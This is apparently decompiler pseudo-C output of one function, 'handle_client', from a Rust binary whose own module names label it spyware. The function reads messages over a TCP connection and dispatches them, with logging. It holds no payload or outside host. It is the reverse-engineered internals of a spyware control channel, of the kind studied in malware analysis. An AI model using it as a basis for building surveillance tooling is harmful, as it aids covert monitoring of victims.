long long spyware::communication::server::handle_client(unsigned int a0)
{
    unsigned int v0;  // [bp-0xf4]
    unsigned long long v1;  // [bp-0xf0]
    int v2;  // [bp-0xe8], Other Possible Types: char, unsigned long long
    unsigned int v3;  // [bp-0xe6]
    unsigned short v4;  // [bp-0xe2]
    unsigned long long v5;  // [bp-0xe0]
    char v6;  // [bp-0xd8], Other Possible Types: unsigned long long
    int v7;  // [bp-0xd8]
    unsigned long long v8;  // [bp-0xd0]
    int v9;  // [bp-0xc8], Other Possible Types: unsigned long long
    int v10;  // [bp-0xb8]
    unsigned long long v11;  // [bp-0xa8]
    int v12;  // [bp-0xa8]
    unsigned long long v13;  // [bp-0xa0]
    char *v14;  // [bp-0x98], Other Possible Types: unsigned long long
    int v15;  // [bp-0x98]
    int v16;  // [bp-0x90], Other Possible Types: unsigned long long
    int v17;  // [bp-0x90]
    int v18;  // [bp-0x88], Other Possible Types: void*
    int v19;  // [bp-0x78]
    char *v20;  // [bp-0x68]
    unsigned long long v21;  // [bp-0x60]
    unsigned short v22;  // [bp-0x58]
    unsigned int v23;  // [bp-0x56]
    unsigned short v24;  // [bp-0x52]
    unsigned long long v25;  // [bp-0x50]
    int v26;  // [bp-0x48], Other Possible Types: char
    int v27;  // [bp-0x38]
    int v28;  // [bp-0x28]
    char v29;  // [bp-0x18]
    unsigned long long v32;  // rax
    int v33;  // xmm0
    int v34;  // xmm0
    unsigned long long v35;  // rax

    v0 = a0;
    if (::0x44be40::core::sync::atomic::atomic_load() >= 4)
    {
        (char)v2.peer_addr(&v0);
        if (*((short *)&v2) == 2)
        {
            ::0x44bab0::core::ptr::drop_in_place<std::net::tcp::TcpStream>(v0);
            return v5;
        }
        v24 = v4;
        v23 = v3;
        memcpy(&v29, &v6, 16);
        v22 = *((short *)&v2);
        v25 = v5;
        memcpy(&v26, &v6, 16);
        v20 = &v22;
        v21 = <core::net::socket_addr::SocketAddr as core::fmt::Display>::fmt;
        v11 = &g_4b8c30;
        v13 = 1;
        v18 = 0;
        v14 = &v20;
        v16 = 1;
        v32 = log::__private_api::loc(&g_4b8c70);
        v2 = "spyware::communication::serverUnrecognized message typeAn error occurred, terminating connection with . Error: ";
        v5 = 30;
        v6 = "spyware::communication::serverUnrecognized message typeAn error occurred, terminating connection with . Error: ";
        v8 = 30;
        v9 = v32;
        log::__private_api::log(&v11, 4, &(char)v2);
    }
    while (true)
    {
        spyware::communication::server::get_message(&v22, &v0);
        if (*((long long *)&v22) == 9223372036854775818)
            break;
        v33 = *((int128_t *)&v22);
        v10 = v28;
        v9 = v27;
        v7 = v26;
        v2 = v33;
        v11 = &g_4b8c50;
        v13 = 1;
        v14 = 8;
        *((uint128_t *)&v17) = 0;
        std::io::stdio::_print(&v11);
        v34 = (int128_t)v2;
        v19 = v10;
        v18 = v9;
        *((int128_t *)&v15) = *((int128_t *)&v6);
        v12 = v34;
        spyware::communication::server::handle_message(&v11, &v0);
    }
    v1 = v25;
    v11 = &g_4b8c40;
    v13 = 1;
    v14 = 8;
    *((uint128_t *)&v16) = 0;
    std::io::stdio::_print(&v11);
    if (!::0x44be40::core::sync::atomic::atomic_load())
    {
        ::0x44bab0::core::ptr::drop_in_place<std::net::tcp::TcpStream>(v0);
        return v25;
    }
    v20 = &v1;
    v21 = <std::io::error::Error as core::fmt::Display>::fmt;
    v11 = &g_4b8c60;
    v13 = 1;
    v18 = 0;
    v14 = &v20;
    v16 = 1;
    v35 = log::__private_api::loc(&g_4b8c88);
    v2 = "spyware::communication::serverUnrecognized message typeAn error occurred, terminating connection with . Error: ";
    v5 = 30;
    v6 = "spyware::communication::serverUnrecognized message typeAn error occurred, terminating connection with . Error: ";
    v8 = 30;
    v9 = v35;
    log::__private_api::log(&v11, 1, &(char)v2);
    ::0x44bab0::core::ptr::drop_in_place<std::net::tcp::TcpStream>(v0);
    return v1;
}
